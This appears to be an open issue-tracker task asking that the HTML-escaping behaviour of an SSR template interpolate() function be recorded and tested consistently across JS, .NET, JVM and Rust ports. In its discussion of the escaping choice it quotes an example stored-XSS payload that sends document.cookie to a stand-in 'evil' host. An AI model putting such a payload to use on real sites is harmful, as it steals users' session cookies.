---
bornAs: xesc4pv
kind: task
status: open
dateOpened: "2026-09-06"
tags: []
---

# Pin the webdirectives-ssr escaping contract with a cross-language conformance vector

`interpolate()` writes a resolved mustache value straight into the output HTML with no escaping of `<`, `>`,
`&` or `"`, in every language port. Four separate jurors raised it on frontierui#43 (the Rust foundation,
#2756) and every one of them marked it `introduced: false` — the Rust port is behaviourally identical to the
landed .NET (#2383) and JVM (#2368) twins, which is what the port was asked to be.

The finding that matters is not the escaping decision. It is that **there is no decision recorded anywhere,
and nothing would notice if a port changed its mind.** A juror mutation-tested it: adding proper escaping to
the Rust `interpolate` breaks no existing test, because every interpolation test in every port uses
plain-text values (`"Ada"`, `"café"`). The wire format's escaping policy is currently an implicit assumption
each port re-derives on its own, and three ports agreeing today is luck rather than a contract.

That is a WE-owned gap: the vectors are WE's (#2354 exports them; #2063/#2065 codify the wire format they
grade), and a unilateral change in one port would break parity with the other two.

## Done when

1. **Executable** — a vector interpolating a value containing `<`, `>`, `&` and `"` exists in
   `we:conformance-vectors/webdirectives-ssr.vectors.json` and pins the intended output bytes, whichever way
   the ruling goes.
2. Every port that owns the interpolation directives grades it: the JS reference, .NET (#2383), JVM (#2368)
   and Rust (#2756). A port that does not yet own the directive skips it, as the harness contract already
   allows — it must not falsely pass.
3. The ruling itself is written down where a future port author reads it, not left implicit in a golden.

## The ruling this needs first

Whether SSR interpolation escapes is a real fork, not a bug to fix by reflex:

- **Escape.** The safe default for anything that reaches a browser. `{{ name }}` carrying
  `<script>fetch('//evil/'+document.cookie)</script>` currently renders a live script tag, which is textbook
  stored XSS the moment any interpolated field carries user-influenced text.
- **Do not escape**, and say so loudly. If the directive's contract is "the author controls this data" — the
  templates are authoring sources, not user content — then escaping would corrupt an author's deliberate
  markup, and the ports are already right. This reading needs the contract STATED, plus a named way for an
  author to interpolate untrusted data safely.

The three ports currently implement the second without ever having chosen it. Either answer closes this;
leaving it underived is what does not.

## Not this item

Changing the Rust port's behaviour alone. frontierui#43 deliberately did not, and said why: parity with its
twins is the property it was built for, and one port diverging is strictly worse than three agreeing on an
unstated rule.
